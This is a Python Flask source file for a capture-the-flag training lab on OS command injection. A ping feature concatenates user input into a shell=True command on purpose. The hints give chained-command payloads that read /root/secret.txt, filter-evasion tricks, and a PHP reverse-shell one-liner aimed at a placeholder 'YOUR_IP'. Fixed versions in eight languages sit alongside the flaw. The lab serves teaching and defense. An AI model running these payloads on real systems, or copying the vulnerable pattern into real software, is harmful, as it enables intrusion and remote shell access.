"""
WildWebApps lab - OS command injection.

"WildTools" is a tiny network-tools page. Its "Ping a host" feature takes the
host you type and builds a shell command out of it, ping -c 1 <host>, then runs
that command through /bin/sh and shows you the output.

The bug is that the host value is CONCATENATED into a command string that is run
BY A SHELL (subprocess with shell=True). The shell interprets metacharacters, so
a value like "127.0.0.1; cat /root/secret.txt" is two commands: the ping, and
then a cat of a file the web user should never read.

The per-process MD5 flag is written to /root/secret.txt (root's home, normally
off-limits). Because the app runs as root in the container, chaining a command
onto the ping reads the flag. The flag rotates on every restart.
"""
import os
import subprocess

from flask import Flask, render_template, request, jsonify

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart).
FLAG = vulnlab.generate_flag()

# The file the flag is planted into. The whole point of the lab is to read this
# path by chaining a command onto the ping, so it defaults to /root/secret.txt.
# In the build sandbox it can be pointed at a writable temp path with SECRET_FILE.
SECRET_FILE = os.environ.get("SECRET_FILE", "/root/secret.txt")

# How long (seconds) to let the shelled-out command run before giving up. Keeps a
# hung command (or a foreground reverse shell) from blocking the worker forever.
CMD_TIMEOUT = int(os.environ.get("CMD_TIMEOUT", "12"))

# Host value shown pre-filled in the input, so the student sees a normal request
# before they start tampering with it.
SAMPLE_HOST = "127.0.0.1"


def plant_flag_in_secret():
    """Write the flag into /root/secret.txt (rotates cleanly on restart).

    If the path is not writable (for example when running unprivileged in a
    sandbox without SECRET_FILE pointed at a temp path), fail quietly so the app
    still starts; the exploit path is exercised against a writable location in
    testing.
    """
    try:
        os.makedirs(os.path.dirname(SECRET_FILE), exist_ok=True)
    except OSError:
        pass
    try:
        vulnlab.plant_in_file(FLAG, SECRET_FILE)
    except OSError:
        pass


plant_flag_in_secret()


def run_ping(host):
    """Build and run the ping command through a shell, return the output.

    Returns a dict the template renders, with one of:
      - "output": the combined stdout+stderr of the command that ran
      - "error":  a note that the command timed out or could not run

    === VULNERABILITY ======================================================
    The host value is concatenated straight into a command STRING, and that
    string is executed with shell=True. That means /bin/sh parses the whole
    line, so shell metacharacters in `host` are honoured: ";" runs a second
    command, "|" pipes into one, "&&"/"||" run one conditionally, and "$(...)"
    / backticks substitute command output. An attacker types
    "127.0.0.1; cat /root/secret.txt" and the shell runs both halves.

    The fix (see the writeup) is to never involve a shell: call ping with an
    argument list, subprocess.run(["ping", "-c", "1", host], shell=False), so
    the host is a single inert argument and metacharacters mean nothing.
    ========================================================================
    """
    # THE BUG: user input concatenated into a shell command line.
    command = "ping -c 1 " + host

    try:
        completed = subprocess.run(
            command,
            shell=True,               # <-- runs the string through /bin/sh
            capture_output=True,
            text=True,
            timeout=CMD_TIMEOUT,
        )
    except subprocess.TimeoutExpired:
        return {
            "command": command,
            "error": "Command timed out (it ran for too long). If you launched a "
                     "reverse shell, background it with a trailing & so the "
                     "request can return.",
        }
    except OSError as exc:
        return {"command": command, "error": "Could not run the command: %s" % exc}

    # Show stdout and stderr together, exactly as a naive tool would surface them.
    output = (completed.stdout or "") + (completed.stderr or "")
    if not output.strip():
        output = "(the command produced no output)"
    return {"command": command, "output": output}


# ---------------------------------------------------------------------------
# In-lab code switcher: the same ping feature, unsafe vs hardened, 8 languages.
# The fix in every language is the same idea: do NOT call a shell. Pass the
# program and its arguments as a list/array so the input stays a single argument.
# ---------------------------------------------------------------------------
LANGUAGES = {
    "Python": {
        "vuln": ("# VULNERABLE: input concatenated into a string run by the shell\n"
                 "host = request.args[\"host\"]\n"
                 "subprocess.run(\"ping -c 1 \" + host, shell=True)  # ; | && honoured"),
        "fixed": ("# FIXED: no shell. Argument list; host is one inert argument.\n"
                  "host = request.args[\"host\"]\n"
                  "subprocess.run([\"ping\", \"-c\", \"1\", host], shell=False, timeout=5)"),
        "doc": "https://docs.python.org/3/library/subprocess.html#security-considerations",
    },
    "Java": {
        "vuln": ("// VULNERABLE: invoking a shell with a concatenated string\n"
                 "String host = req.getParameter(\"host\");\n"
                 "Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"ping -c 1 \"+host});"),
        "fixed": ("// FIXED: ProcessBuilder with a fixed argument list, no shell\n"
                  "String host = req.getParameter(\"host\");\n"
                  "new ProcessBuilder(\"ping\", \"-c\", \"1\", host).start();"),
        "doc": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
    },
    "JavaScript": {
        "vuln": ("// VULNERABLE: child_process.exec runs the string in a shell\n"
                 "const { exec } = require(\"child_process\");\n"
                 "exec(\"ping -c 1 \" + req.query.host, (e, out) => res.send(out));"),
        "fixed": ("// FIXED: execFile with an args array, shell disabled\n"
                  "const { execFile } = require(\"child_process\");\n"
                  "execFile(\"ping\", [\"-c\", \"1\", req.query.host], (e, out) => res.send(out));"),
        "doc": "https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback",
    },
    "TypeScript": {
        "vuln": ("// VULNERABLE: same Node flaw; types do not stop shell parsing\n"
                 "import { exec } from \"child_process\";\n"
                 "exec(`ping -c 1 ${req.query.host}`, (e, out) => res.send(out));"),
        "fixed": ("// FIXED: execFile with an argument array, no shell\n"
                  "import { execFile } from \"child_process\";\n"
                  "execFile(\"ping\", [\"-c\", \"1\", String(req.query.host)], (e, out) => res.send(out));"),
        "doc": "https://nodejs.org/api/child_process.html",
    },
    "PHP": {
        "vuln": ("// VULNERABLE: system/exec/shell_exec/passthru run a shell string\n"
                 "$host = $_GET[\"host\"];\n"
                 "system(\"ping -c 1 \" . $host);   // ; cat /root/secret.txt runs too"),
        "fixed": ("// FIXED: validate, then run via proc_open with an argv (no shell)\n"
                  "$host = $_GET[\"host\"];\n"
                  "if (!preg_match('/^[a-zA-Z0-9.-]+$/', $host)) exit(\"invalid\");\n"
                  "proc_open([\"ping\",\"-c\",\"1\",$host], [1=>[\"pipe\",\"w\"]], $pipes);"),
        "doc": "https://www.php.net/manual/en/function.escapeshellarg.php",
    },
    "Ruby": {
        "vuln": ("# VULNERABLE: backticks and the string form of system use a shell\n"
                 "host = params[:host]\n"
                 "output = `ping -c 1 #{host}`   # interpolation into a shell string"),
        "fixed": ("# FIXED: the multi-argument form runs the program directly, no shell\n"
                  "host = params[:host]\n"
                  "output = IO.popen([\"ping\", \"-c\", \"1\", host]) { |io| io.read }"),
        "doc": "https://docs.ruby-lang.org/en/master/Kernel.html#method-i-system",
    },
    "Go": {
        "vuln": ("// VULNERABLE: dangerous only because it explicitly calls a shell\n"
                 "host := r.URL.Query().Get(\"host\")\n"
                 "out, _ := exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).CombinedOutput()"),
        "fixed": ("// FIXED: exec.Command with separate args does NOT use a shell\n"
                  "host := r.URL.Query().Get(\"host\")\n"
                  "out, _ := exec.Command(\"ping\", \"-c\", \"1\", host).CombinedOutput()"),
        "doc": "https://pkg.go.dev/os/exec#Command",
    },
    "C#": {
        "vuln": ("// VULNERABLE: routing the command through cmd.exe /c with a built string\n"
                 "var host = Request.Query[\"host\"];\n"
                 "Process.Start(\"cmd.exe\", \"/c ping -n 1 \" + host);"),
        "fixed": ("// FIXED: run the program directly, arguments as a list, no shell\n"
                  "var psi = new ProcessStartInfo(\"ping\") { UseShellExecute = false };\n"
                  "psi.ArgumentList.Add(\"-n\"); psi.ArgumentList.Add(\"1\");\n"
                  "psi.ArgumentList.Add(Request.Query[\"host\"]); Process.Start(psi);"),
        "doc": "https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist",
    },
}

INSTRUCTIONS = [
    "The WildTools page pings a host for you. Send the sample value first and "
    "confirm it works: 127.0.0.1 returns normal ping output.",
    "The host you type is dropped straight into a shell command (ping -c 1 "
    "<host>). Test for injection by chaining a second command with a separator: "
    "try 127.0.0.1; id and look for uid=... in the output.",
    "Now read the target file. The flag lives in /root/secret.txt, which the web "
    "user should not be able to read, but the app runs as root. Chain a cat: "
    "127.0.0.1; cat /root/secret.txt.",
    "Prefer a different operator? 127.0.0.1 | cat /root/secret.txt pipes into "
    "cat, and nohost || cat /root/secret.txt runs cat as the fallback when the "
    "ping fails. All three reach the same file.",
    "Copy the 32-char MD5 flag from the output and submit it below. It rotates on "
    "every restart.",
]

HINTS = [
    "Start by proving execution, not by grabbing the flag. Append a separator and "
    "a harmless command: 127.0.0.1; id  (or  127.0.0.1 | whoami). If you see "
    "uid=0(root) or the username, the shell ran your second command.",
    "The five separators to know: ; runs the next command always, | pipes output "
    "into the next command, && runs the next only if the first SUCCEEDS, || runs "
    "the next only if the first FAILS, and $(...) / backticks substitute a "
    "command's output inline.",
    "Read the flag file directly:\n"
    "  127.0.0.1; cat /root/secret.txt\n"
    "The ping runs, then cat prints /root/secret.txt. The 32-char hex string is "
    "the flag.",
    "If a space or ; ever gets stripped, remember the alternatives: ${IFS} in "
    "place of a space, a newline (%0a in a URL) in place of ;, and backticks or "
    "$(...) in place of a separator. This lab does not filter, but real targets "
    "do.",
    "Bonus (reverse shell): start nc -lvnp 4444 on your machine, then chain\n"
    "  127.0.0.1; php -r '$s=fsockopen(\"YOUR_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &\n"
    "or the netcat mkfifo one-liner from the writeup, to catch an interactive "
    "root shell. Real-world fix: never build shell command lines from input; call "
    "the program with an argument list (shell=False).",
]

REFERENCES = [
    ("OWASP - Command Injection",
     "https://owasp.org/www-community/attacks/Command_Injection"),
    ("OWASP Cheat Sheet - OS Command Injection Defense",
     "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"),
    ("OWASP WSTG - Testing for Command Injection",
     "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection"),
    ("PortSwigger - OS command injection",
     "https://portswigger.net/web-security/os-command-injection"),
    ("MITRE - CWE-78",
     "https://cwe.mitre.org/data/definitions/78.html"),
]


def _page(result=None, submitted_host=None):
    """Render the lab page, optionally with a ping result."""
    return render_template(
        "index.html",
        title="WildTools - OS Command Injection",
        instructions=INSTRUCTIONS,
        hints=HINTS,
        references=REFERENCES,
        languages=LANGUAGES,
        sample_host=SAMPLE_HOST,
        submitted_host=submitted_host if submitted_host is not None else SAMPLE_HOST,
        result=result,
    )


@app.get("/")
def index():
    """Show the ping form pre-filled with the sample host."""
    return _page()


@app.post("/")
def ping():
    """Run the ping (unsafely, via a shell) and show its output."""
    host = request.form.get("host", "")
    result = run_ping(host)
    return _page(result=result, submitted_host=host)


@app.post("/check")
def check():
    """Validate a submitted flag (used by the answer box)."""
    return jsonify(correct=vulnlab.check_flag(FLAG, request.form.get("flag", "")))


if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    port = int(os.environ.get("PORT", "8000"))
    app.run(host=host, port=port, debug=False, threaded=True)
